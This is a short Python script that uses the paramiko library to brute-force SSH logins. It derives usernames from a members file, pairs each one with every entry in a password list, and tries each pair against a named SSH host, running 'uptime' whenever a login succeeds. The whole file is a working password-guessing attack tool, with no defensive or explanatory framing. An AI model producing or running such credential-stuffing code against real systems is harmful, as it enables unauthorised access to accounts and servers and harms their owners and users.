import paramiko
paramiko.util.log_to_file("paramikolog.log")
usernames = []
passwords = []
creds = []
with open ('members.txt', 'r') as doommembers:
	for member in doommembers:
		member = member.rstrip()
		member = member.split(" ")

		yn = member[-1]
		
		if yn == "yes":
			member = member[0]
			member = member.lower()
			member = member[1:4]
			usernames.append(member)
with open ('passwords.txt', 'r') as passlib:
	for pw in passlib:
		#pw = pw.split()
		passwords.append(pw.rstrip())	
for un in usernames:
	for pwd in passwords:
		combo = {"user": un, "pass": pwd}
		creds.append(combo)

	

for cred in creds:
	try:
		client = paramiko.SSHClient()
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		print("Trying", cred["user"],cred["pass"])
		client.connect("ssh.lodsecretwebsite.com", username=cred["user"], password=cred["pass"])
		stdin, stdout, error = client.exec_command("uptime")

		print(stdout.readlines())
		print("Success")
	except Exception as ecode:
		client.close()
		print("Failed",ecode)